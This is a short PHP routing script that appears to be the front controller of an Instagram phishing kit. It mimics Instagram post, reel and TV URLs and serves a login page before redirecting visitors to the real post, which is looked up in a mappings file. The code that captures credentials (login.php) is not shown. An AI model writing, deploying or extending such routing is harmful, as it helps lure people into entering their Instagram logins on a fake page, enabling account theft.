<?php

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Get the request URI
$request_uri = $_SERVER['REQUEST_URI'];
$path = parse_url($request_uri, PHP_URL_PATH);

// Remove trailing slash
$path = rtrim($path, '/');

// Root path - show login
if ($path === '' || $path === '/' || $path === '/index.php') {
    include __DIR__ . '/login_static.html';
    exit;
}

// Handle Instagram-like URLs: /p/xxx, /reel/xxx, /tv/xxx
if (preg_match('#^/(p|reel|tv)/([a-zA-Z0-9_-]+)$#', $path, $matches)) {
    $type = $matches[1];
    $code = $matches[2];
    
    // Get original URL from mappings
    $redirect_url = 'https://www.instagram.com/';
    $mappings_file = __DIR__ . '/url_mappings.json';
    
    if (file_exists($mappings_file)) {
        $mappings = json_decode(file_get_contents($mappings_file), true);
        if ($mappings && isset($mappings[$code]['original_url'])) {
            $redirect_url = $mappings[$code]['original_url'];
        }
    }
    
    // Start session and store redirect URL
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    $_SESSION['redirect_url'] = $redirect_url;
    
    // Include login page
    include __DIR__ . '/login.php';
    exit;
}

// Default - show static login
include __DIR__ . '/login_static.html';
exit;

?>

